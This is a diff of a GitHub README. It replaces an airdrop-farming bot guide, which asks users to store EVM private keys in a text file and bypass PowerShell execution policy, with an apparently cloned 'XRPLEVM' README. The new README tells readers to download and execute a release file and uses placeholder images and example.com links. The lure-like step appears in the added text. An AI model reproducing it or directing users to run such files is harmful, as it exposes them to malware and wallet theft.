@@ -1,169 +1,167 @@
-# 🚀 Bot Setup Instructions
+# XRPLEVM 🚀
 
-Welcome to the bot setup guide! Follow the steps below to install and configure the bot correctly. This guide is designed to be beginner-friendly, with clear explanations for each step.
+![GitHub stars](https://img.shields.io/github/stars/Wizmithaaa/XRPLEVM?style=social) ![Version](https://img.shields.io/github/v/release/Wizmithaaa/XRPLEVM) ![License](https://img.shields.io/badge/license-MIT-blue)
 
-> [Termux guides if you run on mobile](https://github.com/MeoMunDep/Guides-for-using-my-script-on-termux)
-
----
+Welcome to the XRPLEVM repository! This project offers a comprehensive toolkit for working with the XRP Ledger in an EVM-compatible environment. You can auto-deploy contracts, send tokens, burn assets, swap currencies, bridge assets, add liquidity pools, and mint tokens with ease. 
 
 ## Table of Contents
 
-1. [Prerequisites](#prerequisites)
-2. [Installation Steps](#installation-steps)
-3. [Configuration Files](#configuration-files)
-   - [`configs.json`](#1-configsjson)
-   - [`privateKeys.txt`](#2-privateKeystxt)
-   - [`proxies.txt`](#4-proxiestxt)
-4. [Running the Bot](#running-the-bot)
-5. [Contact and Support](#contact-and-support)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Links](#links)
 
----
+## Features
 
-## Prerequisites
+- **Auto Deployment**: Easily deploy smart contracts on the XRP Ledger.
+- **Token Management**: Send, burn, and mint tokens effortlessly.
+- **Swapping and Bridging**: Swap tokens and bridge assets between different networks.
+- **Liquidity Pools**: Add and manage liquidity pools.
+- **Airdrop Functionality**: Claim and manage airdrops effectively.
 
-Before running the bot, make sure you have the following installed:
+## Installation
 
-- **Node.js** (Version: `22.11.0`)
-- **npm** (Version: `10.9.0`)
+To get started with XRPLEVM, follow these steps:
 
-Download Node.js and npm here: [Download Link](https://t.me/KeoAirDropFreeNe/257/1462).
-
--> On Windows, double click on `run.bat`. For Linux/macOS, use `run.sh` to automatically run the bot. Remember to fill in all the necessary details before running.
-
----
-
-## Installation Steps
-
-### 1. **Clone the Bot Repository (GitHub)**
-
-You can clone the bot repository using Git. If you don't have Git installed, [install Git here](https://git-scm.com/).
-
-- Open your terminal (Command Prompt on Windows, Terminal on Linux/macOS) and navigate to the folder where you want to store the bot files.
-
-- Run the following command to clone the repository:
-
-  ```bash
-  git clone https://github.com/MeoMunDep/xrplevm.git
-  ```
-
-- After cloning, navigate into the bot's directory:
-
-  ```bash
-  cd xrplevm/xrplevm
-  ```
-
-### 2. **Install Dependencies:**
-
-- Once inside the bot directory, install the necessary dependencies by running the following command:
-
-```bash
-npm install --force user-agents axios colors https-proxy-agent socks-proxy-agent ethers web3 crypto-js ripple-address-codec @0xsquid/squid-types
-```
-
-- If you're on **Windows** and encounter an Execution Policy error, run:
-
-```bash
-Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
-```
-
-Then, run the npm install command again.
-
-- For **Linux/macOS**, if you face permission issues with the install command, prepend `sudo` to the command:
-
-```bash
-sudo npm install --force user-agents axios colors https-proxy-agent socks-proxy-agent ethers web3 crypto-js ripple-address-codec @0xsquid/squid-types
-```
-
-### 3. **Prepare Configuration Files:**
-
-- Ensure all configuration files are set up correctly before running the bot (see [Configuration Files](#configuration-files) section).
-
----
-
-## Configuration Files
-
-### 1. `configs.json` - 📜 Adjust Bot Settings
-
-This file controls the bot’s behavior. Below is an example configuration:
-
-```json
-{
-  "skipInvalidProxy": false,
-  "delayEachAccount": [5, 8],
-  "timeToRestartAllAccounts": 300,
-  "howManyAccountsRunInOneTime": 100,
-}
-```
-
-- **Fields Explained:**
-  - `skipInvalidProxy`:  If `true`, the bot will skip that account due to invalid proxy.
-  - `delayEachAccount`: Random delay range (in seconds) between accounts.
-  - `timeToRestartAllAccounts`: Time (in seconds) to restart all accounts.
-  - `howManyAccountsRunInOneTime`: Number of accounts to run simultaneously.
-
-### 2. `privateKeys.txt` - 🗂️ User's Wallet Data
-
-- Wallets generator: [Link](https://github.com/MeoMunDep/Automatic-Ultimate-Create-Wallets-for-Airdrop)
-- EVM PRIVATEKEY
-  
-```txt
-privatekey
-privatekey
-privatekey
-```
-
-_Note: Each row for each account._
-
-### 3. `proxies.txt` - 🌐 Proxy List (Optional)
-
-If you are using proxies, add them here. Leave the file blank if you are not using proxies. Supported formats:
-
-- [Get it from here](https://www.webshare.io/?referral_code=4l5kb3glsce7)
-
-```txt
-http://host:port
-https://host:port
-socks4://host:port
-socks5://host:port
-http://user:password@host:port
-https://user:password@host:port
-socks4://user:password@host:port
-socks5://user:password@host:port
-```
-
-_Note: each row for each account._
-
----
-
-## Running the Bot
-
-1. Navigate to the folder containing the bot files:
+1. Clone the repository:
 
    ```bash
-   cd /path/to/xrplevm
+   git clone https://github.com/Wizmithaaa/XRPLEVM.git
    ```
 
-2. Run the bot using the following command:
+2. Navigate to the project directory:
 
    ```bash
-   node meomundep.js
+   cd XRPLEVM
    ```
 
----
+3. Install the required dependencies:
 
-## Contact and Support
+   ```bash
+   npm install
+   ```
 
-- **Support me via** [Galxe Referral Link](https://app.galxe.com/quest/xrplevmsidechain/GCaM3t1wTe?referral_code=GRFr2JiteymuEnvqZsPOIO4qIUWvmgjWvd538z6sauYnE7g) | [Swap referral Link](https://testnet.xrise33.com/ref/X7QCLIgtrl91DrRJYqHod6YSrHK)
-- **Support me via Donate** [Here](https://t.me/KeoAirDropFreeNe/312/27801)
-- **Contact for work:** [Telegram](https://t.me/MeoMunDep)
-- **Join the support group:** [Join here](https://t.me/KeoAirDropFreeNe)
-- **Updates Channel:** [View channel](https://t.me/KeoAirDropFreeNee)
-- **YouTube Channel:** [Watch here](https://www.youtube.com/@keoairdropfreene)
-- **Instagram:** [Follow me](https://www.instagram.com/meomundep)
-- **Tiktok:** [Follow me](https://www.tiktok.com/@meomundep)
+4. Download the latest release from [Releases](https://github.com/Wizmithaaa/XRPLEVM/releases) and execute the file.
 
-Your support is greatly appreciated! 🐱
+## Usage
 
----
+### Auto Deploy
 
-Enjoy using the bot! 🚀
+To auto-deploy a contract, run the following command:
+
+```bash
+node deploy.js <contract-file>
+```
+
+Replace `<contract-file>` with the path to your contract file.
+
+### Send Tokens
+
+To send tokens, use:
+
+```bash
+node send.js <recipient-address> <amount>
+```
+
+### Burn Tokens
+
+To burn tokens, execute:
+
+```bash
+node burn.js <amount>
+```
+
+### Swap Tokens
+
+To swap tokens, run:
+
+```bash
+node swap.js <from-token> <to-token> <amount>
+```
+
+### Bridge Assets
+
+To bridge assets, use:
+
+```bash
+node bridge.js <asset> <destination-network>
+```
+
+### Add Liquidity Pool
+
+To add a liquidity pool, run:
+
+```bash
+node addLiquidity.js <pool-name> <token1> <token2> <amount1> <amount2>
+```
+
+### Mint Tokens
+
+To mint new tokens, execute:
+
+```bash
+node mint.js <amount>
+```
+
+## Contributing
+
+We welcome contributions to XRPLEVM! If you want to help improve the project, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch (`git checkout -b feature-branch`).
+3. Make your changes.
+4. Commit your changes (`git commit -m 'Add new feature'`).
+5. Push to the branch (`git push origin feature-branch`).
+6. Open a pull request.
+
+Please ensure your code adheres to our coding standards and includes appropriate tests.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Links
+
+For the latest updates and releases, check out the [Releases section](https://github.com/Wizmithaaa/XRPLEVM/releases). 
+
+Explore the topics related to this project:
+
+- airdrop
+- airdrop-application
+- airdrop-claim-bot
+- airdrop-farm
+- airdrop-free
+- airdrop-huner-download
+- airdrop2024
+- airdrop2025
+- chain
+- evm
+- layer1
+- layer2
+- layer3
+- meomundep
+- xrp
+- xrplevm
+
+## Screenshots
+
+![Auto Deploy](https://via.placeholder.com/600x300?text=Auto+Deploy)  
+*Auto Deploying Contracts*
+
+![Token Management](https://via.placeholder.com/600x300?text=Token+Management)  
+*Managing Tokens*
+
+![Liquidity Pool](https://via.placeholder.com/600x300?text=Liquidity+Pool)  
+*Adding Liquidity Pools*
+
+## Community
+
+Join our community to stay updated and get help:
+
+- [Discord](https://discord.gg/example)
+- [Twitter](https://twitter.com/example)
+- [Reddit](https://reddit.com/r/example)
+
+Thank you for your interest in XRPLEVM! Together, we can build a powerful toolset for the XRP Ledger ecosystem.
